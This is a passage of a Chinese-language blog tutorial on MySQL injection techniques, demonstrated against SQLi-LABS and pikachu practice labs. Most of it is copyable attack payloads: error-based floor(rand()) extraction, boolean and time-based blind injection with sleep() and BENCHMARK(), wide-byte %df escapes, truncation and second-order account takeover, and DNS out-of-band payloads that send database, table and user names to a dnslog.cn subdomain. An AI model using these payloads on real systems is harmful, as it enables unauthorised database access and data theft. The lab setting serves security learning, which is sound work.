<li>检查的主键值与插入的主键值不同的情况很少见。如果主键是函数表达式<code>floor(rand(0)*2)</code>，主键值是伪随机数列中的元素，那么在检查主键和插入主键时产生的两个值就可能不同。</li>
<li>由于<code>floor(rand(0)*2)</code>产生的值在检查虚拟表主键时与表内的主键值并不重复，因此会向虚拟表插入“新的”主键。但是，在插入时又会重新计算<code>floor(rand(0)*2)</code>的值，如果第二次计算的值刚好跟第一次计算的值不一样，又恰巧与表内现有的主键值重复，将导致MySQL报错。</li>
</ul>
<p>payload结构：<code>&#39;and (select 1 from (select count(*),concat(0x7e,(select语句),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x)a)--+</code></p>
<p><img src="https://i.loli.net/2021/10/05/sXLmv31tN72cGlY.png" alt="736de83719ff30ab41dcd3a546daf538.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">爆数据库名：&#x27;and (select 1 from (select count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a)--+</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a) --+</span><br><span class="line"></span><br><span class="line">爆列名：&#x27;and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot; limit 0,1),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a)--+</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;and (select 1 from (select count(*),concat(0x7e,(select COLUMN_NAME from TABLE_NAME limit 0,1),0x7e,floor(rand(0)*2)) x from information_schema.tables group by x) a)--+</span><br></pre></td></tr></table></figure>

<h2 id="基于布尔运算的盲注"><a href="#基于布尔运算的盲注" class="headerlink" title="基于布尔运算的盲注"></a>基于布尔运算的盲注</h2><p>基于布尔运算的盲注（Boolean-based blind SQL injection）是盲注的一种。</p>
<p>下面简单介绍一下盲注。如果攻击者想要获取信息无法直接显示在页面上，那么他可以通过返回页面的内容或响应时间的不同来获取相关信息，这种方式叫做盲注。盲注的信息获取效率不如其他类型的注入。在基于布尔运算的盲注后，应用程序仅会返回包含“True”或“False”的页面，因此，在一次完整的信息获取过程中往往需要多次进行请求和试探。</p>
<p>最简单的基于布尔盲注，形如<code>and 1=1</code> <code>and 1=2</code>。如果两次请求返回的页面不一样，则表示该接口处存在注入点。</p>
<p>如何利用布尔盲注payload获取数据？首先要了解MySQL的字符串截取函数，它们在构造payload的过程中起着重要作用。</p>
<ul>
<li>mid()函数：mid(string,start,length)，从字符串string中返回一个包含length个字符的子串，子串的起始位置在start处。</li>
<li>substr()函数：substr(string,start,length)，从字符串string中返回一个包含length个字符的子串，子串的起始位置在start处。</li>
<li>left()函数：left(string,length)，对字符串string，从左开始取length个字符的子串。</li>
<li>right()函数：right(string,length)，对字符串string，从右开始取length个字符的子串。</li>
</ul>
<p>构造布尔盲注的payload，其核心思想是：利用截取函数将想要获取信息的字符串拆分成单个字符，然后使用二分查找法进行猜解。</p>
<h3 id="测试正常回显与错误回显"><a href="#测试正常回显与错误回显" class="headerlink" title="测试正常回显与错误回显"></a>测试正常回显与错误回显</h3><p>在这里使用SQLi-LABS靶场第8关进行演示</p>
<p>正常回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and 1=1 --+</span><br></pre></td></tr></table></figure>

<p><img src="/post/Users/blood/AppData/Roaming/Typora/typora-user-images/image-20211006102936406.png" alt="image-20211006102936406"></p>
<p>错误回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and 1=2 --+</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/CNHXkE6QUd3RPVb.png" alt="c6abaef7e5faca1a6342f7154f292ecc.png"></p>
<h3 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><p>判断数据库的第1个字符的ASCII是否大于100</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))&gt;100 --+</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/image-20211006094959115.png" alt="image-20211006094959115"></p>
<p>回显正常，说明大于100</p>
<p>判断是否大于120</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))&gt;120 --+</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/q6iRxYUKrTjSZlz.png" alt="bca1a9293491d8b26bc5d5d753f131d3.png"></p>
<p>回显错误，说明不大于120</p>
<p>通过二分法以此类推，最终可以判断第一个字符的ASCII值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))=115 --+</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/MIyOiTVDA9psurq.png" alt="963d023bcf803d5370102ec74f3f3734.png"></p>
<p>通过查找ASCII表可以判断该字符为“s”</p>
<p><img src="https://i.loli.net/2021/10/05/B8AGKLWJPS6Ng5Z.png" alt="79bb022428457989a1a33062014d1400.png"></p>
<p>同理，其他字符也可以通过盲注得出</p>
<h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><p>步骤同上。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br></pre></td></tr></table></figure>

<h3 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><p>步骤如上。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100 --+</span><br></pre></td></tr></table></figure>

<h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3><p>步骤如上。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and ascii(substr((select username from users limit 0,1),1,1))&gt;65 --+</span><br></pre></td></tr></table></figure>

<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>当使用其他方法无法从数据库服务器中检索信息时，攻击者就有可能使用基于时间的盲注（Time-based blind SQL injection）进行注入。其原理是：利用MySQL中的延迟函数查看SQL语句是否可以执行，也可以理解为通过页面响应时间判断延时语句是否执行成功，进而通过推断得到一些信息。所以时间型盲注也是一种边信道攻击。</p>
<h3 id="测试能否使用延时盲注"><a href="#测试能否使用延时盲注" class="headerlink" title="测试能否使用延时盲注"></a>测试能否使用延时盲注</h3><p>在这里使用SQLi-LABS靶场第9关进行演示</p>
<p>通过<code>and 1=1</code> <code>and 1=2</code> 无法判断回显正确与错误</p>
<p>这时查看能否使用sleep()函数测试</p>
<p>测试正常数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/image-20211006102818321.png" alt="image-20211006102818321"></p>
<p>说明and前的语句执行成功，执行sleep(5)，使得加载时多花了5秒时间</p>
<p>测试错误数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=-1&#x27; and sleep(5) --+</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/jSZ1LVHYzgJeQNB.png" alt="e996bf3ced4f390797e770ab07d9bc86.png"></p>
<p>说明and前的语句执行错误，就不执行sleep(5)，加载时间和原来一样</p>
<p>通过这一特性，就可以使用布尔型盲注一样的方法去测试。</p>
<h3 id="猜解数据库名-1"><a href="#猜解数据库名-1" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;100,sleep(5),null) --+</span><br></pre></td></tr></table></figure>

<h3 id="猜解表名-1"><a href="#猜解表名-1" class="headerlink" title="猜解表名"></a>猜解表名</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(5),null) --+</span><br></pre></td></tr></table></figure>

<h3 id="猜解字段名-1"><a href="#猜解字段名-1" class="headerlink" title="猜解字段名"></a>猜解字段名</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100,sleep(5),null) --+</span><br></pre></td></tr></table></figure>

<h3 id="猜解数据-1"><a href="#猜解数据-1" class="headerlink" title="猜解数据"></a>猜解数据</h3><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;65,sleep(5),null) --+</span><br></pre></td></tr></table></figure>

<h3 id="BENCHMARK-函数"><a href="#BENCHMARK-函数" class="headerlink" title="BENCHMARK()函数"></a>BENCHMARK()函数</h3><p>在MySQL中，有一个<code>BENCHMARK()</code>函数，它是用于测试函数性能的。它有两个参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr)</span><br></pre></td></tr></table></figure>

<p>函数执行的结果，是将表达式<code>expr</code>执行<code>count</code>次。</p>
<p>因此，利用<code>BENCHMARK()</code>函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长；通过时间长短变化，可以判断出注入语句是否执行成功。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜解数据库名：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;100,BENCHMARK(10000000,MD5(1)),null) --+</span><br><span class="line"></span><br><span class="line">猜解表名：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,BENCHMARK(10000000,MD5(1)),null) --+</span><br><span class="line"></span><br><span class="line">猜解字段名：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;100,BENCHMARK(10000000,MD5(1)),null) --+</span><br><span class="line"></span><br><span class="line">猜解数据：http://hackrock.com:811/Less-9/?id=1&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;65,BENCHMARK(10000000,MD5(1)),null) --+</span><br></pre></td></tr></table></figure>

<h2 id="DNS带外通信注入"><a href="#DNS带外通信注入" class="headerlink" title="DNS带外通信注入"></a>DNS带外通信注入</h2><h3 id="什么是带外通道技术"><a href="#什么是带外通道技术" class="headerlink" title="什么是带外通道技术"></a>什么是带外通道技术</h3><p>在渗透中，经常碰到关闭回显的漏洞，常见的XXE盲注，SQL盲注，反序列化无回显，这个时候常用到OOB带外数据通道，带外通道技术（OOB）让攻击者能够通过另一种方式来确认和利用所谓的盲目（blind）的漏洞。在这种盲目的漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功逃避监控，绕过防火墙且能更好的隐藏自己。</p>
<h3 id="OOB利用原理"><a href="#OOB利用原理" class="headerlink" title="OOB利用原理"></a>OOB利用原理</h3><p>1、常规SQL注入，获取服务器信息的方式</p>
<p><img src="https://i.loli.net/2021/10/05/I58SWpJs9d3yuPT.png" alt="img"></p>
<p>2、SQL注入利用DNS获取查询结果（OOB）</p>
<p>我们需要一个三级域名服务器（nameserver）也是DNS服务器（DNS Server），也就是下图的schloar服务器。</p>
<p>还需要配置域名“<a href="http://www.scholar.com”对应的解析ip地址为“schloar服务器”的ip地址./">www.scholar.com”对应的解析IP地址为“schloar服务器”的IP地址。</a></p>
<p>这样就能够实时地监控域名查询请求了，图示如下：</p>
<p><img src="https://i.loli.net/2021/10/05/9wiITvejCJ5OAYS.png" alt="img"></p>
<h3 id="DNS带外注入靶场复现"><a href="#DNS带外注入靶场复现" class="headerlink" title="DNS带外注入靶场复现"></a>DNS带外注入靶场复现</h3><h4 id="实验提准备——DNSLog"><a href="#实验提准备——DNSLog" class="headerlink" title="实验提准备——DNSLog"></a>实验提准备——DNSLog</h4><p>打开DNSLog网站 (<a href="http://www.dnslog.cn),点击get/">http://www.dnslog.cn)，点击Get</a> SubDomain得到一个子域名</p>
<p><img src="https://i.loli.net/2021/10/05/FyotJ3mSiKadfbz.png" alt="d0ae8c347502f14c5927c668dfa717b4.png"></p>
<p>发送ICMP包进行测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping cs1qjb.dnslog.cn</span><br></pre></td></tr></table></figure>



<p>回到DNSLog页面，刷新记录即可得到刚才ping查询的结果</p>
<p><img src="https://i.loli.net/2021/10/05/AKbO8e562qZfriN.png" alt="57fb30bbb46e75026e10984eeafb1517.png"></p>
<h4 id="实验前准备——load-file"><a href="#实验前准备——load-file" class="headerlink" title="实验前准备——load_file()"></a>实验前准备——load_file()</h4><p>MySQL使用带外注入的前提数据库必须配置<code>secure_file_priv</code>，且当前用户拥有读写数据的权限。</p>
<p>查看<code>secure_file_priv</code>变量的值</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
<li>当secure_file_priv为G:\，就可以读取G盘的文件。</li>
<li>当secure_file_priv为null，load_file就不能加载文件。</li>
</ul>
<p><img src="https://i.loli.net/2021/10/05/7oWsbEFl9LuvDz1.png" alt="fb1da6930b6d134621129dd36805e0ca.png"></p>
<p>若该值为NULL，则需要在mysql的配置文件（my.ini）中设置 <code>secure_file_priv = &#39;&#39;</code></p>
<p><img src="https://i.loli.net/2021/10/05/wdQE7KR9AxsjghG.png" alt="3209f789243f97414ec5928f97478fa4.png"></p>
<p>若当前数据库用户没有读写文件权限，可以使用GRANT语句授予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT FILE ON *.* TO &#x27;user&#x27;@&#x27;%&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<p>注：*.*指所有数据库的数据表；user为当前用户；%为所有ip地址</p>
<p>测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(&quot;\\\\test.cs1qjb.dnslog.cn\\xxx.txt&quot;)--+</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061046744.png" alt="705994f52d3311ab0d725a7d25746092.png"></p>
<p>新增一条查询记录，可以进行带外注入</p>
<h4 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,database(),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/69OCAfLmvB3dDgS.png" alt="de6479cb29b3eacef1c3fea89821f39c.png"></p>
<h4 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/e26OHWr7myfvzsJ.png" alt="756705f2f600b14b681581c698792ac6.png"></p>
<h4 id="获取字段名-1"><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 2,1),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/f2JXxzIacOhnNDL.png" alt="de2a849c5c357b5090903f062a9ec218.png"></p>
<h4 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h4><p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:811/Less-8/?id=1&#x27; and load_file(concat(&quot;\\\\&quot;,(select username from users limit 0,1),&quot;.cs1qjb.dnslog.cn\\xxx.txt&quot;))--+</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/kGQjpMioBnr219q.png" alt="7b22f942a9dc01baf397d5397c0bc3cf.png"></p>
<h2 id="基于字符集的宽字节注入"><a href="#基于字符集的宽字节注入" class="headerlink" title="基于字符集的宽字节注入"></a>基于字符集的宽字节注入</h2><h3 id="宽字节注入介绍与原理"><a href="#宽字节注入介绍与原理" class="headerlink" title="宽字节注入介绍与原理"></a>宽字节注入介绍与原理</h3><p>注入攻击中常常会用单引号<code>&#39;</code>、双引号<code>&quot;</code>等特殊字符。在应用中，开发者为了安全，经常会使用转义字符<code>\</code>来转义这些特殊字符。当数据库使用了“宽字符集”时，可能会产生一些意想不到的漏洞。</p>
<p>想要深入理解MySQL中的宽字节注入，首先要了解一些转义函数（PHP），包括<code>addslashes</code>、<code>mysql_real_escape_string</code>、<code>mysql_escape_string</code>、<code>magic_quote_gpc</code>（高版本的PHP去掉了这个函数）。转义函数可用于将MySQL注入Payload中的部分危险字符转义，使攻击者无法有效截断原语句并拼接自己想要的Payload语句，起到安全防护的作用。</p>
<p>宽字节是指两个字节的宽度的编码技术，例如GB2312、GBK、GB18030、BIG5等。宽字节对转义字符的影响发生在<code>character_set_client=gbk</code>的情况下，也就是说，如果客户端发送的数据使用的字符集是GBK，就可能会“吃掉”转义字符<code>\</code>，进而导致转义失败，执行攻击者构造的Payload。</p>
<p>若存在宽字节注入，攻击者在输入<code>%df%27</code>时，首先会通过前面提到的单引号转义，将其转换为<code>%df%5c%27</code>（<code>%5c</code>是反斜杠<code>\</code>的URL编码）。在进行数据库查询之前，由于使用了GBK多字节编码（在汉字编码范围内两个字节会被编码为一个汉字），MySQL服务器会对查询语句进行GBK编码，即将<code>%df%5c</code>转换成汉字“<strong>運</strong>”，而单引号将会“逃逸”，在使用查询语句中的单引号闭合。</p>
<h3 id="宽字节注入靶场复现"><a href="#宽字节注入靶场复现" class="headerlink" title="宽字节注入靶场复现"></a>宽字节注入靶场复现</h3><p>在这里使用pikachu靶场的宽字节注入进行演示。</p>
<p>首先提交表单并使用burpsuite进行抓包</p>
<p><img src="https://i.loli.net/2021/10/05/kJ9Xp4u3Pig25Oa.png" alt="44ad00a591e2148b85cc3cf22d8009fe.png"></p>
<p>发送到Repeater，构造payload <code>1%df&#39; or 1=1 #</code></p>
<p><img src="https://i.loli.net/2021/10/05/IGqYLAja7UPKbtC.png" alt="51a94ef6ff0f91bd17d192f75261d158.png"></p>
<p>可以看出爆出所有用户数据。</p>
<p>宽字节注入是绕过转义函数的一种手段，可结合其他注入攻击方式，payload很好构造，只需是在单引号前加上<code>%df</code>。</p>
<p>另外，基于字符集的攻击并不局限于SQL注入，凡是会解析数据的地方都可能存在此问题。比如在XSS攻击时，由于浏览器与服务器返回的字符编码不同，也可能会存在字符集攻击。</p>
<p>要解决这种问题，需要统一数据库、操作系统、Web应用所使用的字符集，以避免各层对字符的理解存在差异。统一设置为UTF-8是一个很好的方法。</p>
<h2 id="超长字符截断注入"><a href="#超长字符截断注入" class="headerlink" title="超长字符截断注入"></a>超长字符截断注入</h2><h3 id="超长字符截断原理"><a href="#超长字符截断原理" class="headerlink" title="超长字符截断原理"></a>超长字符截断原理</h3><p>在MySQL的配置选项中，有一个sql_mode选项。定义了mysql应该支持的sql语法，数据校验等。可以通过以下方式查看当前数据库使用的sql_mode：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@sql_mode;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/05/csaqRrNnOdePlxV.png" alt="img"></p>
<p>mysql5.0版本以上支持了三种sql_mode模式，如下：</p>
<table>
<thead>
<tr>
<th>模式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>ANSI</td>
<td>宽松模式，对插入数据进行校验，如果不符合定义类型或长度，对数据类型调整或截断保存，报warning警告。</td>
</tr>
<tr>
<td>TRADITIONAL</td>
<td>传统模式，当向mysql数据库插入数据时，进行数据的严格校验，保证错误数据不能插入，报error错误。用于事务时，会进行事务的回滚。</td>
</tr>
<tr>
<td>STRICT_TRANS_TABLES</td>
<td>严格模式，进行数据的严格校验，错误数据不能插入，报error错误。</td>
</tr>
</tbody></table>
<p>默认情况下，mysql选择使用的是严格模式，此时如果插入的数据超过限制长度，则会报错error（<strong>如果超出的长度是由空格引起的，可能只会警告warning，实际操作证明，三种模式下，如果插入的超出长度是由空格引起的，并不会报错，仅仅会警告。</strong>）。</p>
<p>其实这个注入姿势很难找到了，因为它需要满足以下条件：</p>
<ul>
<li>可以注册用户，而且可以注册带有空格的用户</li>
<li>你需要知道管理员的账号</li>
</ul>
<p>查看以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table test(</span><br><span class="line">    -&gt; id int,</span><br><span class="line">    -&gt; username varchar(20),</span><br><span class="line">    -&gt; password varchar(30)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.31 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into test(id,username,password) values(1,&quot;admin                                                                                            hello  &quot;,&quot;aaaaaaaa&quot;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.12 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id,username,password from test;</span><br><span class="line">+------+----------------------+----------+</span><br><span class="line">| id   | username             | password |</span><br><span class="line">+------+----------------------+----------+</span><br><span class="line">|    1 | admin                | aaaaaaaa |</span><br><span class="line">+------+----------------------+----------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure>

<p>username的最大长度是20，可是我插入的明显超过20，而在使用select查询的时候，username超过的部分被截取掉了。</p>
<p>倘若现在有一个sql语句，它可以是完完全全的没有注入，但是如果允许空字符注册的话，那么就会导致我们今天的这个“<strong>长字符串截断注入</strong>”</p>
<p><code>select id,username,password from users where username = &#39;admin&#39;;</code></p>
<p>假设管理员的账号就是“admin”，那么我们就去注册一个“admin ”的用户。（PS:后面有哦很多空格哦，等待被截取掉就直接替换掉admin这个账号了）危害还是很大的。</p>
<h3 id="超长字符截断靶场复现"><a href="#超长字符截断靶场复现" class="headerlink" title="超长字符截断靶场复现"></a>超长字符截断靶场复现</h3><p>在这里使用SQLi-Labs第24关进行演示。</p>
<p><img src="https://i.loli.net/2021/10/05/faQeIJ59dloznKN.png" alt="2003511573ceb082806180fa25fe5ab5.png"></p>
<p>注册用户名：admin x</p>
<p>注册密码：123456</p>
<p>查看数据库，可以看到新增用户为admin，密码为123456</p>
<p><img src="https://i.loli.net/2021/10/05/AeX1dLM84ogvQlE.png" alt="e476c758349289994a637ae30c247986.png"></p>
<p>我们使用 用户名：admin，密码：123456 进行登录</p>
<p><img src="https://i.loli.net/2021/10/05/K5cnb3vFGq1pWiX.png" alt="e6d78a5ad298d6acc1b88e3900497836.png"></p>
<p>成功登录</p>
<p><img src="https://i.loli.net/2021/10/05/izyasOlLv49hJXS.png" alt="83359b1ee4f08aea03d80ad2818095a3.png"></p>
<p>不过这里登录的其实还是第2个admin用户，所以并不能通过此用户更改原admin的密码</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h3><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p>
<p><strong>二次注入，可以概括为以下两步:</strong></p>
<ul>
<li>第一步：插入恶意数据 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</li>
<li>第二步：引用恶意数据 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/8581772-b024d9bb4acded26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/854/format/webp" alt="img"></p>
<h3 id="二次注入靶场复现"><a href="#二次注入靶场复现" class="headerlink" title="二次注入靶场复现"></a>二次注入靶场复现</h3><p>在这里使用SQLi-Labs第24关进行演示。</p>
<p>打开页面可以看到一个登陆界面，尝试用<code>admin&#39;#</code>进行注入，失败。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/8581772-f955882874b3b8e5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/897/format/webp" alt="img"></p>
<p>部分源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到使用了<code>mysql_real_escape_string</code>进行转义处理，无法进行SQL注入。</p>
<p>继续研究，发现登陆页面可以进行用户注册，这里我们注册一个<code>admin&#39;#</code>的账号，登陆该账号后可以进行密码修改。</p>
<p><img src="https://i.loli.net/2021/10/05/wpWX3nPFgtvb6HG.png" alt="e912e4b8aedd8e35cb1b73b1be333743.png"></p>
<p>注册新用户过程中的处理代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line">    <span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select count(*) from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">    <span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$res</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//print_r($row);</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>[<span class="number">0</span>]== <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">        &lt;script&gt;alert(<span class="string">&quot;The username Already exists, Please choose a different username &quot;</span>)&lt;/script&gt;;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:1, url=new_user.php&#x27;</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment"># 